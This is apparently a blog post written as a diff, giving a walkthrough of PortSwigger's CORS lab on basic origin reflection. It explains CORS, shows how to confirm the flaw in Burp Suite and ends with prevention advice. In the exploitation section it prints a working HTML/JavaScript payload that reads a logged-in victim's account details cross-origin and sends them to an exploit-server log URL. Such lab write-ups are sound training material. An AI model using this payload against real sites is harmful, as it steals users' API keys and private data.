@@ -1,0 +1,206 @@
+---
+layout: post
+title: "PortSwigger WebSecurity Academy - CORS Lab 1: Basic Origin Reflection"
+subtitle: "Easy Difficulty"
+date: 2026-03-17
+author: "Your Name"
+categories: [security, web-security]
+tags: [cors, web, portswigger]
+img: ":2026-03-17/cors-lab1-intro.png"
+image_viewer_on: true
+image_lazy_loader_on: true
+---
+
+## Overview
+
+**Challenge/Lab:** CORS Vulnerability with Basic Origin Reflection  
+**Platform:** PortSwigger Web Security Academy  
+**Difficulty:** Easy  
+**Status:** ✅ Solved
+
+### Summary
+
+During a security assessment, a CORS (Cross-Origin Resource Sharing) misconfiguration was discovered that allowed complete bypass of the Same-Origin Policy. This vulnerability enabled an attacker to steal sensitive user information including API keys, email addresses, and session tokens from authenticated users.
+
+This writeup walks through the complete exploitation process using PortSwigger's Web Security Academy lab as a practical example.
+
+**Lab:** [CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
+
+---
+
+## Background: What is CORS?
+
+Cross-Origin Resource Sharing (CORS) is a browser security mechanism that controls how web pages from one origin can access resources from another origin. By default, browsers enforce the **Same-Origin Policy (SOP)**, which blocks cross-origin requests.
+
+![:cors-lab1-intro](:2026-03-17/cors-lab1-intro.png)
+
+**Example scenario:**
+- Website A: `https://legitimate-site.com`
+- Website B: `https://attacker-site.com`
+
+Without CORS, if a user visits Website B, JavaScript on that page cannot read data from Website A (blocked by Same-Origin Policy). With a CORS misconfiguration, Website B can bypass this protection.
+
+### How CORS Works
+
+When JavaScript makes a cross-origin request:
+
+```javascript
+fetch('https://api.example.com/user/data', {
+    credentials: 'include'  // Send cookies
+})
+```
+
+The server responds with:
+
+```
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://trusted-site.com
+Access-Control-Allow-Credentials: true
+```
+
+The browser checks: does `Access-Control-Allow-Origin` match the requesting origin? If yes, allow JavaScript to read the response. If no, block access.
+
+### The Vulnerability
+
+A CORS misconfiguration occurs when the server dynamically reflects the `Origin` header:
+
+```
+Request:
+  Origin: https://evil.com
+
+Response:
+  Access-Control-Allow-Origin: https://evil.com     ← REFLECTED!
+  Access-Control-Allow-Credentials: true            ← ALLOWS COOKIES!
+```
+
+This combination is critical because:
+1. Any origin becomes "trusted"
+2. Authenticated requests are possible (cookies sent)
+3. Private data can be read by the attacker's JavaScript
+
+---
+
+## Exploitation
+
+### Tools Used
+
+| Tool | Purpose |
+|------|---------|
+| Burp Suite | Intercept and analyze HTTP requests/responses |
+| Exploit Server | Host the malicious JavaScript payload |
+
+### Step 1: Configure Burp Suite & Capture Traffic
+
+Start Burp Suite and ensure the Proxy is listening on `127.0.0.1:8080`. Configure your browser to use Burp as a proxy and turn off Intercept.
+
+Navigate to the lab, log in, and access your account page. Switch to **Proxy → HTTP history** and look through the requests for AJAX calls. You'll find the `/accountDetails` endpoint:
+
+![:cors-lab1-174946](:2026-03-17/cors-lab1-174946.png)
+
+The application uses a script like the following to fetch and display the API key:
+
+```javascript
+fetch('/accountDetails', {credentials:'include'})
+    .then(r => r.json())
+    .then(j => document.getElementById('apikey').innerText = j.apikey)
+```
+
+### Step 2: Confirm Origin Reflection
+
+Right-click the `/accountDetails` request and send it to **Repeater**. Add an `Origin` header with an arbitrary value and click Send to reveal sensitive data:
+
+![:cors-lab1-175054](:2026-03-17/cors-lab1-175054.png)
+
+Observe that the server reflects the supplied origin back in `Access-Control-Allow-Origin` and includes `Access-Control-Allow-Credentials: true` — the vulnerability is confirmed.
+
+```
+HTTP/2 200 OK
+Access-Control-Allow-Origin: https://exploit-*.exploit-server.net/exploit   ← reflected!
+Access-Control-Allow-Credentials: true
+```
+
+### Step 3: Craft the Malicious Payload
+
+Understanding the attack flow:
+
+1. Victim is logged into `target.web-security-academy.net`
+2. Victim visits attacker's website
+3. Attacker's JavaScript executes in victim's browser
+4. JavaScript makes a request to `target.web-security-academy.net`
+5. Browser automatically sends victim's session cookie
+6. Server returns victim's private data + CORS headers
+7. Attacker's JavaScript reads the response (CORS allows it)
+8. Data is exfiltrated to attacker's server
+
+Create a malicious page on the exploit server. The payload must be a full HTML page with the JavaScript wrapped in `<script>` tags:
+
+![:cors-lab1-175242](:2026-03-17/cors-lab1-175242.png)
+
+```html
+<html>
+  <body>
+    <script>
+      var req = new XMLHttpRequest();
+      req.onload = reqListener;
+      req.open('get', 'https://vulnerable-website.com/accountDetails', true);
+      req.withCredentials = true;
+      req.send();
+
+      function reqListener() {
+          location = '//exploit-server.com/log?key=' + this.responseText;
+      }
+    </script>
+  </body>
+</html>
+```
+
+### Step 4: Deliver the Exploit
+
+Host the payload on the exploit server and deliver the link to the victim. When the victim visits the page, their browser makes an authenticated request to the vulnerable site. Because the server reflects the attacker's origin and allows credentials, the response — including the API key — is returned to the attacker's script and exfiltrated.
+
+![:cors-lab1-175229](:2026-03-17/cors-lab1-175229.png)
+
+After delivery, review the HTTP access log on the exploit server to retrieve the admin API key from the exfiltrated response.
+
+![:cors-lab1-174906](:2026-03-17/cors-lab1-174906.png)
+
+---
+
+## Key Findings & Lessons Learned
+
+### What Worked Well
+- Burp Suite's Repeater made it easy to confirm the origin reflection behavior by manually adding an `Origin` header
+- The exploit server provided a convenient way to host the malicious payload and capture the exfiltrated API key in the access log
+
+### Challenges Encountered
+- **Challenge:** Understanding why `Access-Control-Allow-Credentials: true` is critical to the attack
+- **Resolution:** Without this header, the browser strips cookies from the cross-origin request, meaning the server returns unauthenticated data only — no sensitive API key
+
+### Key Takeaways
+- Never dynamically reflect arbitrary `Origin` headers without validation
+- `Access-Control-Allow-Credentials: true` combined with a wildcard or reflected origin is a critical misconfiguration
+- CORS is **not** a protection against CSRF — it is a relaxation of the same-origin policy, not a security boundary in itself
+- The exploit payload must be a full HTML page with the JavaScript wrapped in `<script>` tags — a bare `.js` file won't execute in the browser context needed
+
+---
+
+## How to Prevent CORS-Based Attacks
+
+- **Specify trusted origins explicitly** — never reflect the `Origin` header without validating it against a strict whitelist
+- **Avoid `Access-Control-Allow-Origin: null`** — sandboxed iframes and local files can send `null` as the origin
+- **Avoid wildcards on internal networks** — internal browsers can still access untrusted external domains
+- **CORS is not a substitute for server-side security** — always enforce authentication and session management server-side
+
+---
+
+## References
+
+- [PortSwigger: CORS Vulnerability with Basic Origin Reflection (Lab)](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
+- [PortSwigger: Cross-Origin Resource Sharing (CORS)](https://portswigger.net/web-security/cors)
+- [PortSwigger: Same-Origin Policy](https://portswigger.net/web-security/cors/same-origin-policy)
+- [Exploiting CORS Misconfigurations for Bitcoins and Bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
+
+---
+
+**Status:** ✅ Solved  
+**Last Updated:** 2026-03-17
